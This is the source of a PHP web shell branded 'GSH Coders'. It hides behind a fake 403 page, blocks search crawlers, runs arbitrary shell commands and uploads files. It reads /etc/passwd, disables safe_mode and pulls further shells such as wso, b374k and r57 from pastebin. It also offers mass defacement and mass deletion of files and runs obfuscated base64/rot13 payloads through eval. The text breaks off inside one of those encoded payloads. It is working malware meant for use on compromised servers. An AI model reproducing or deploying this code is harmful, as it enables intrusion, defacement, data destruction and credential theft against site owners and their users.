<?php
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
 
$auth_pass = "6988458604002080d97c9b63e391d2fd"; // default: anazvr
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
 
function login_shell() {
?><!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<?php
$errorforbidden = $_SERVER['REQUEST_URI'];
?>
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access <? print $errorforbidden; ?>
 on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>

<form name="vsss" id="vsss" method="post" enctype='multipart/form-data'>
<center><div style="display: none;">
Passwordnya bang :V<br>
<form method="post">
<input type="password" name="pass">
</form></div></center>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html>
<head>
<title>GSH Coders</title>
<meta name='author' content='Garuda Security Hacker'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);



html {
    background: #000000;
    color: cyan;
    font-family: 'Ubuntu';
	font-size: 13px;
	width: 100%;
}
	h2 {
	-webkit-animation-name: blinker;
	-webkit-animation-duration: 3s;
	-webkit-animation-timing-function: linear;
	-webkit-animation-iteration-count: infinite;
	
	-moz-animation-name: blinker;
	-moz-animation-duration: 2s;
	-moz-animation-timing-function: linear;
	-moz-animation-iteration-count: infinite;
	
	 animation-name: blinker;
	 animation-duration: 1s;
	 animation-timing-function: linear;
	 animation-iteration-count: infinite;
	}
	
	@-moz-keyframes blinker {  
	 0% { opacity: 1.0; }
	 50% { opacity: 0.0; }
	 100% { opacity: 1.0; }
	 }
	
	@-webkit-keyframes blinker {  
	 0% { opacity: 1.0; }
	 50% { opacity: 0.0; }
	 100% { opacity: 1.0; }
	 }
	
	@keyframes blinker {  
	 0% { opacity: 1.0; }
	 50% { opacity: 0.0; }
	 100% { opacity: 1.0; }
	 }
li {
	display: inline;
	margin: 5px;
	padding: 5px;
	color: blue;
}
table, th {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
}
   td,hr,gr,.kampret{
	border-style:solid;
	border-color:blue ;}
.table_home, .th_home, .td_home {
	border: 1px solid blue;
}
th {
	padding: 10px;
	border: 1px solid blue;
}
a {
	color: #ffffff;
	text-decoration: none;
}
a:hover {
	color: gold;
	text-decoration: underline;
}
b {
	color: gold;
}

hr {
	border: 1px solid blue;
}


input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Ubuntu';
	font-size: 13px;
}
select {
	width: 152px;
	background: #000000; 
	color: white; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
option:hover {
	background: blue;
	color: #000000;
	
}
#menu{
	background:url(/welcome.jpg);
	margin:8px 2px 4px 2px;
}
#menu a{
	padding:4px 18px;
	border: 1px solid blue;
	margin:0;
	background:black;
	text-decoration:none;
	letter-spacing:1px;
	-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;

}
#menu a:hover{
	background:#191919;
	border-bottom:1px solid cyan;
	border-top:1px solid cyan;
}

</style>
</head>
<center>
<?php
if (file_exists("php.ini")){
}else{
$img = fopen('php.ini', 'w');
$sec = "safe_mode = OFF
disable_funtions = NONE";
fwrite($img ,$sec);
fclose($img);}		
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function exe($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
$info = 'p';
} else {
$info = 'u';
}
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
return $info;
}
function hdd($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
}
function CreateTools($names,$lokasi){
	if ( $_GET['create'] == $names ){
		$a= "".$_SERVER['SERVER_NAME']."";
$b= dirname($_SERVER['PHP_SELF']);
$c = "/cox_tools/".$names.".php";
if (file_exists('cox_tools/'.$names.'.php')){
	echo '<script type="text/javascript">alert("Done");window.location.href = "cox_tools/'.$names.'.php";</script> ';
	}
	else {mkdir("cox_tools", 0777);
file_put_contents('cox_tools/'.$names.'.php', file_get_contents($lokasi));
echo ' <script type="text/javascript">alert("Done");window.location.href = "cox_tools/'.$names.'.php";</script> ';}}}

CreateTools("wso","http://pastebin.com/raw/3eh3Gej2");
CreateTools("adminer"."https://www.adminer.org/static/download/4.2.5/adminer-4.2.5.php");
CreateTools("b374k","http://pastebin.com/raw/rZiyaRGV");
CreateTools("injection","http://pastebin.com/raw/nxxL8c1f");
CreateTools("promailerv2","http://pastebin.com/raw/Rk9v6eSq");
CreateTools("gamestopceker","http://pastebin.com/raw/QSnw1JXV");
CreateTools("bukapalapak","http://pastebin.com/raw/6CB8krDi");
CreateTools("tokopedia","http://pastebin.com/dvhzWgby");
CreateTools("encodedecode","http://pastebin.com/raw/wqB3G5eZ");
CreateTools("mailer","http://pastebin.com/raw/9yu1DmJj");
CreateTools("r57","http://pastebin.com/raw/G2VEDunW");
CreateTools("tokenpp","http://pastebin.com/raw/72xgmtPL");
CreateTools("extractor","http://pastebin.com/raw/jQnMFHBL");
CreateTools("bh","http://pastebin.com/raw/3L2ESWeu");
CreateTools("dhanus","http://pastebin.com/raw/v4xGus6X");
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($_GET['dir']);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$ling="http://".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."?create";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
$d0mains = @file("/etc/named.conf");
			$users=@file('/etc/passwd');
        if($d0mains)
        { 
			$count;  
			foreach($d0mains as $d0main)
			{
				if(@ereg("zone",$d0main))
				{
					preg_match_all('#zone "(.*)"#', $d0main, $domains);
					flush();
					if(strlen(trim($domains[1][0])) > 2)
					{
						flush();
						$count++;
			   		} 
			   	}
			}
		}

$sport=$_SERVER['SERVER_PORT'];
echo "<hr>";
echo "<table width=100% border=0 >";
echo "<tr><td align=left>";
echo "System: <font color=lime>".php_uname()."</font><br>";
echo "User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")<br>";
echo "Server IP: <font color=lime>".gethostbyname($_SERVER['HTTP_HOST'])."</font> | Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "HDD: <font color=lime>".hdd(disk_free_space("/"))."</font> / <font color=lime>".hdd(disk_total_space("/"))."</font><br>";
echo "Websites :<font color=lime> $count </font> Domains<br>";
echo "Port :<font color=lime>  $sport</font> <br>";
echo "Safe Mode: $sm<br>";
echo "Disable Functions: $show_ds<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "[ ".w($dir,"Writeable")." ]</td><br />";
echo "	   <br /> 
<td align=center>
	   <center><h2 style=margin:0; color;white; font-size:100px; line-height:150px; font-weight:bold;>SHELL RECODE BY ANAZVR</h1>
</td>";
echo "</tr></table>";
echo "<br>"; 


echo "<center>";
echo "<div class=kampret>";
echo "<ul>";
echo "<div id=menu>";
echo "[ <a href='?'>Home</a> ]</li>";
echo "[ <a href='?dir=$dir&do=upload'>Upload</a> ]";
echo "[ <a href='?dir=$dir&do=cmd'>Command</a> ]";
echo "[ <a href='?dir=$dir&do=mass_deface'>Mass Deface</a> ]";
echo "[ <a href='?dir=$dir&do=config'>Config</a> ]";
echo "[ <a href='?dir=$dir&do=jumping'>Jumping</a> ]";
echo "[ <a href='?dir=$dir&do=symlink'>Symlink</a> ]<br><br>";
echo "[ <a href='?dir=$dir&do=cpanel'>CPanel Crack</a> ]";
echo "[ <a href='?dir=$dir&do=smtp'>SMTP Grabber</a> ]";
echo "[ <a href='?dir=$dir&do=zoneh'>Zone-H</a> ]";
echo "[ <a href='?dir=$dir&do=defacerid'>Defacer.ID</a> ]<br><br>";
echo "[ <a href='?dir=$dir&do=sql'>MySQL Manager</a> ]";
echo "[ <a href='?dir=$dir&do=fake_root'>Fake Root</a> ]";
echo "[ <a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a> ]";
echo "[ <a href='?dir=$dir&do=auto_wp'>Auto Edit Title WordPress</a> ]";
echo "[ <a href='?dir=$dir&do=auto_dwp2'>WordPress Auto Deface V.2</a> ]";
echo "[ <a href='?dir=$dir&do=passwbypass'>Bypass etc/passw</a> ]<br><br> ";
echo "[ <a href='?dir=$dir&do=loghunter'>Log Hunter</a> ]";
echo "[ <a href='?dir=$dir&do=shellchk'>Shell Checker</a> ]";
echo "[ <a href='?dir=$dir&do=shelscan'>Shell Finder</a> ]";
echo "[ <a href='?dir=$dir&do=zip'>Zip Menu</a> ]";
echo "[ <a href='?dir=$dir&do=about'>About</a> ]";
echo "[ <a href='?dir=$dir&do=metu'>LogOut</a><br> ]";
echo "</div>";
echo "</ul>";
echo "</div>";
echo "</center>";
echo "<br>";

if($_GET['do'] == 'upload') {
	echo "<center>";
	if($_POST['upload']) {
		if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
			$act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
		} else {
			$act = "<font color=red>failed to upload file</font>";
		}
	}
	echo "Upload File: [ ".w($dir,"Writeable")." ]<form method='post' enctype='multipart/form-data'><input type='file' name='ix_file'><input type='submit' value='upload' name='upload'></form>";
	echo $act;
	echo "</center>";
} 
 elseif($_GET['do'] == 'cmd') {
	echo "<form method='post'>
	<font style='text-decoration: underline;'>".$user."@".gethostbyname($_SERVER['HTTP_HOST']).":~# </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
} elseif($_GET['do'] == 'mass_deface') {
	echo "<center><form action=\"\" method=\"post\">\n";
	$dirr=$_POST['d_dir'];
	$index = $_POST["script"];
	$index = str_replace('"',"'",$index);
	$index = stripslashes($index);
	function edit_file($file,$index){
		if (is_writable($file)) {
		clear_fill($file,$index);
		echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
		} 
		else {
			echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
			}
			}
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	function clear_fill($file,$index){
		if(file_exists($file)){
			$handle = fopen($file,'w');
			fwrite($handle,'');
			fwrite($handle,$index);
			fclose($handle);  } }

	function gass(){
		global $dirr , $index ;
		chdir($dirr);
		$me = str_replace(dirname(__FILE__).'/','',__FILE__);
		$files = scandir($dirr) ;
		$notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
		sort($files);
		$n = 0 ;
		foreach ($files as $file){
			if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
				echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
				edit_file($file,$index);
				flush();
				$n = $n +1 ;
				} 
				}
				echo "<br>";
				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
					}
	function ListFiles($dirrall) {

    if($dh = opendir($dirrall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
			}

			closedir($dh);
			return $files;
		}
	}
	function gass_all(){
		global $index ;
		$dirrall=$_POST['d_dir'];
		foreach (ListFiles($dirrall) as $key=>$file){
			$file = str_replace('//',"/",$file);
			echo "<center><strong>$file</strong> ===>";
			edit_file($file,$index);
			flush();
		}
		$key = $key+1;
	echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['mass'] == 'onedir') {
		echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
		$ini="http://";
		$mainpath=$_POST[d_dir];
		$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){
		$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){
			echo"$ini$row/$file\n";
			}
		}
		echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
		$mainpath=$_POST[d_dir];$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
		}

	}
	elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
	elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
	elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
	elseif($_POST['mass'] == 'massdeface') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";	}
	else {
		echo "
		<center><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
		<option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		<font style='text-decoration: underline;'>Folder:</font><br>
		<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input type='text' name='d_file' value='69.php' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Anazvr</textarea><br>
		<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></center>";
		}
	}
elseif($_GET['do'] == 'zip') {
	echo "<center><h1>Zip Menu</h1>";
function rmdir_recursive($dir) {
    foreach(scandir($dir) as $file) {
       if ('.' === $file || '..' === $file) continue;
       if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
       else unlink("$dir/$file");
   }
   rmdir($dir);
}
if($_FILES["zip_file"]["name"]) {
	$filename = $_FILES["zip_file"]["name"];
	$source = $_FILES["zip_file"]["tmp_name"];
	$type = $_FILES["zip_file"]["type"];
	$name = explode(".", $filename);
	$accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
	foreach($accepted_types as $mime_type) {
		if($mime_type == $type) {
			$okay = true;
			break;
		} 
	}
	$continue = strtolower($name[1]) == 'zip' ? true : false;
	if(!$continue) {
		$message = "Itu Bukan Zip  , , GOBLOK COK";
	}
  $path = dirname(__FILE__).'/';
  $filenoext = basename ($filename, '.zip'); 
  $filenoext = basename ($filenoext, '.ZIP');
  $targetdir = $path . $filenoext;
  $targetzip = $path . $filename; 
  if (is_dir($targetdir))  rmdir_recursive ( $targetdir);
  mkdir($targetdir, 0777);
	if(move_uploaded_file($source, $targetzip)) {
		$zip = new ZipArchive();
		$x = $zip->open($targetzip); 
		if ($x === true) {
			$zip->extractTo($targetdir);
			$zip->close();
 
			unlink($targetzip);
		}
		$message = "<b>Sukses Gan :)</b>";
	} else {	
		$message = "<b>Error Gan :(</b>";
	}
}	
echo '<table style="width:100%" border="1">
  <tr><td><h2>Upload And Unzip</h2><form enctype="multipart/form-data" method="post" action="">
<label>Zip File : <input type="file" name="zip_file" /></label>
<input type="submit" name="submit" value="Upload And Unzip" />
</form>';
if($message) echo "<p>$message</p>";
echo "</td><td><h2>Zip Backup</h2><form action='' method='post'><font style='text-decoration: underline;'>Folder:</font><br><input type='text' name='dir' value='$dir' style='width: 450px;' height='10'><br><font style='text-decoration: underline;'>Save To:</font><br><input type='text' name='save' value='$dir/cox_backup.zip' style='width: 450px;' height='10'><br><input type='submit' name='backup' value='BackUp!' style='width: 215px;'></form>";	
	if($_POST['backup']){ 
	$save=$_POST['save'];
	function Zip($source, $destination)
{
    if (extension_loaded('zip') === true)
    {
        if (file_exists($source) === true)
        {
            $zip = new ZipArchive();

            if ($zip->open($destination, ZIPARCHIVE::CREATE) === true)
            {
                $source = realpath($source);

                if (is_dir($source) === true)
                {
                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

                    foreach ($files as $file)
                    {
                        $file = realpath($file);

                        if (is_dir($file) === true)
                        {
                            $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                        }

                        else if (is_file($file) === true)
                        {
                            $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                        }
                    }
                }

                else if (is_file($source) === true)
                {
                    $zip->addFromString(basename($source), file_get_contents($source));
                }
            }

            return $zip->close();
        }
    }

    return false;
}
	Zip($_POST['dir'],$save);
	echo "Done , Save To <b>$save</b>";
	}
	echo "</td><td><h2>Unzip Manual</h2><form action='' method='post'><font style='text-decoration: underline;'>Zip Location:</font><br><input type='text' name='dir' value='$dir/file.zip' style='width: 450px;' height='10'><br><font style='text-decoration: underline;'>Save To:</font><br><input type='text' name='save' value='$dir/cox_unzip' style='width: 450px;' height='10'><br><input type='submit' name='extrak' value='Unzip!' style='width: 215px;'></form>";
	if($_POST['extrak']){
	$save=$_POST['save'];
	$zip = new ZipArchive;
	$res = $zip->open($_POST['dir']);
	if ($res === TRUE) {
		$zip->extractTo($save);
		$zip->close();
	echo 'Succes , Location : <b>'.$save.'</b>';
	} else {
	echo 'Gagal Mas :( Ntahlah !';
	}
	}
echo '</tr></table>';	
	}
	elseif($_GET['do'] == 'shellchk') {
		eval(str_rot13(gzinflate(str_rot13(base64_decode(('vUddQtswFH1epf4HcCE1VUxbNvEwdSMGd9FeJtGhPaygyLZ5B6jc5AaHORP/fdf5IoXxsBeiSbGdZu491z6+cTiA1GVPdCkwDTIaDnM5lyVupoT5Nc1ymWWmWpZdRm9FXWOGqzguTlue4Utjpa+p53a411OCIcKZFCxqGVUES63F8XGSylAx3jr+oATX45SXE3LBubGwAsM16RLpY5Jlp+aHh1RR8jscWaPZpI0dzbay/hdZJJqkziiFUZV5t5ohSmIE1POy0M+Bl+381rjEL1whj5xmh/kwvC85oifDTp6wqlXyADr2ynAJKJgpiEaeTrCvLaDIA/J0OCD47FswS6Yi85pEzzrYVoNF2ujEg0OX0jJ1duvpWlW+hORmhxQIElNvPuS/inBksxEA98JsNaPjRIiU9civj2FpYL5jhElwWdN8KmUSZ3fm5NNn2pVFMWILSHUuPTFerhbfSYs1Xax+nV2s4u+Xl4slegNI6MckWBxvdmiUx6SRWHUftOXZ5jWmD/Gi9qAUbdMVvKPKP6elKVxA1QayIrWnG3A59y6ibiMjrDMd9OI+9UfcyU9QsvB3W5VwT4eDHam5xc85F8ACd40q3EvfeMxADe3HzatgAcLD58AhwYNoyOxJDvqc5pYhhrOHCO8Y097nXM6vJACLfvCEct6IWaMfGxj5VXOGSwk5Opai4J5n72gj0Wfza+sM+x29+D6bR5eFWaK2xCcCQcELBxy9Y8DbOjFY2nF26JjF88lC3zmYZHEJ8hYkTFaJFtp7j3dpzPvfdKxZKYx9j1CWkFJfuSbvZMzDAf78MRdXgQ724/Oz5cVtR7dA7BK95oW9TvX6id8rrLYhYIaupzSEqntthpHSeYK2aXmfYEWLxqojGkjH3mRJcryqge1uN6CvYvgbLZdJJPqPi928ml2vNqHd+yU4Q6botthiDsI//AU='))))));
	} elseif($_GET['do'] == 'loghunter')
	{eval(str_rot13(gzinflate(str_rot13(base64_decode(("tUl7YtpVEP87VXyHiZMr0BLsPJqqgJ14QyBquuNrXEUlEExeeL2E5hZ7wS5pmu9+s7ZWgDM5RCmWJXt0f7Pz3JnJ52lphOsTQ+odbjFOjaGl1CCfWIlGTyPgLguIpQ+VoQKRYD7x8N8mDhsqC/iZRJ9DoxtDqNYDyx4xYA+20BUmvjEF7mw4wlL9WZ8J5o69b6lpcyhg8Qipju+aXkAVo35z+/az5KVGhoozmlEBilhLltbJyVCl6WULvpDx7kNE11lDpQ14NJsKY9hQKEyligc8DHNJFU8xcrXUKgRGV6hWhVooC6xMRCshRH2fz31OLQCfKtyQGVyNpOOg+DflE+hSPAhY+VyXsxRlZ6p3x+qRaWsK2sfqx3B13OZmN4E1QrZ9xuyqqkG5KyaEzCsuidTJdfbJEWEGzOYOE5PAim4j1fEJ/eSOSz7XHm5cqFE2n3bv1XwO4jeYFvfNxmyzNSgkrivclR7zuenIilALjFRpEM65SNzHY2A0nGubQ8Fdv+igZpH2sgfcAblAO6Vpj8lUPkUQYezqhVcB3r2DxaJFKL2AlvDykRjQbmRtpXt90eu0zi/+MJu9U/uijb8VuUxbclBEsBs45k+zkpS3K6iYBVLFaBylnOgI0hRL5Y3FQXRZfmiYBqEwMTNal2AkLeYk59Uya4KEVgfxLZhvd2PP9Djjmxm+i3WCbKyD0jm/ely2bV0lC8ZrMI/PSC4dTjskikOPWSQKiiRBlYk2KBQLancWQQZPKjtVNbgbxDLisK9w5ZNcjAFea4uBWE9P9T1a6/e7mtFxb8YtIi+SxYw7S8EcHX4+7R8bVxyhipKCcTHI0urpvyS8ijMz4sz1Wh6GxcLeoH3wp2nwmR/8RjF/+WNj9+FKVsElEitlvUooy9iV913ikmym133XiZ2pQbgjQUJZQrjEE5mO2peRjLGrIc0EvygbVDwqA/c8J+SOLzB2Q6kSJp0MzIZnS+ZUHcuQxS8P5vT/2KW2meKRHbey2DEnkutEuHe1GtDBZRMI6HD2F8rxaCjBjx+QTxpKDfidRgsLX/VsOyt7Mm/6IohStil49uKEetKv3+73D0KMWDsk3BP0jfIvrUvo8YG21e3o94+7mnP8FXTYGyqXptOW2vVBNe2kdNwiZh+r/Ns6D/N6WPV+vrTAT8slKBWe8WvLrREPoeMLav70RqakveP7ZuvYcdErllZIvvJ77rg0sNlJhj1PnYNCxUdCm/1rPK6MLByKKpbARIhG7ES6OQm5NTdvM7826yo34HbLiMVo85WApX0fXpBkw5+LB9CNtD7hkLPex0rFQBHbKs5S5j2nxQVCGfrXN63ehflb++a622H1z